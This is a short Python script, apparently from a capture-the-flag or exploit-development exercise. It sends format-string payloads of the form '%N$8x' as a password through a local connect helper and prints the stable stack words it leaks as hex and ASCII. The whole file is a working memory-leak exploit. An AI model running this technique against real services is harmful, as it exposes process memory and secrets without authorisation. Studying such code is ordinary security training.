#! /usr/bin/python3
from typing import Iterable, Union

import tqdm

from connect import connect


def readable_decode(inp: Union[bytes, Iterable[int]]) -> str:
    out = ''
    for byte in inp:
        if 33 <= byte <= 125:
            out += chr(byte)
        else:
            out += f"\\x{byte:02x}"
    return out


def main():
    words_to_check = 256
    num_inner = 64
    # Note the value at 26$ and 27$ won't be accessible, but that's ok as that should be the input buffer itself

    for i in tqdm.trange(1, words_to_check + 1):
        u = set()
        for j in range(num_inner):
            u.add(connect(password=b"%%%i$8x" % i).decode('ASCII'))
        if len(u) == 1:
            v = tuple(u)[0]
            v = v.replace(' ', '0')
            str_bytes = (v[:2], v[2:4], v[4:6], v[6:8])[::-1]
            byte_bytes = [int(s, 16) for s in str_bytes]
            tqdm.tqdm.write(f"{i:4}:  {v}  {readable_decode(byte_bytes)}")


if __name__ == '__main__':
    main()
